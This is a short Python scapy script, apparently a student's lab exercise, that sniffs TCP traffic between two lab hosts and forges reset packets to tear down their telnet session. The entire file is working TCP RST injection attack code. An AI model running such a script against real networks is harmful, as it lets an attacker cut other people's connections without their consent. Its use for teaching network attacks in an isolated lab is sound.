#!/bin/env python3

# Capture the packet 10.9.0.7:port rand->10.9.0.6 port 23
# spoof a RST packet 10.9.0.6:port rand->10.9.0.7 port 23
from scapy.all import*
def spoof(pkt):
    #IP 
    ip=IP(src=pkt[IP].dst,dst=pkt[IP].src) # Since we send package A->B, We spoof a packet B->A reverse the source & destination
    #TCP
    #Dest same reason for the port number 
    # ack and seq+1 please check the lab report
    tcp= TCP(sport=pkt[TCP].dport,dport=pkt[TCP].sport,flags="R",seq=pkt[TCP].ack)
    new_pkt=ip/tcp
    ls(new_pkt)
    send(new_pkt,verbose=0)
    print("RST is coming")
sniff(filter='ip src 10.9.0.7 and tcp', iface='br-1ac8f49cbf4c',prn=spoof)
